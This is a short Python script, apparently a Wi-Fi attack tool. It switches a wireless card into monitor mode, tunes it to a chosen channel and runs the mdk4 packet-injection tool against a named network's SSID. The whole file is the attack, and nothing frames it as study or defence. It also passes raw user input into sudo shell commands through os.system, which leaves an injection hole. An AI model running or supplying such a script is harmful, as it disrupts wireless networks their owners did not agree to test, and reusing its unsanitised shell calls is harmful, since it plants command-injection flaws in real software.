import os 

os.system("sudo airmon-ng start wlan0")
interface = "wlan0"
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  ssid = input("enter the ssid/name_of_the_wifi of the router: ")
  os.system(f"sudo mdk4 {interface} -E {ssid}")
except KeyboardInterrupt:
  print("exited")

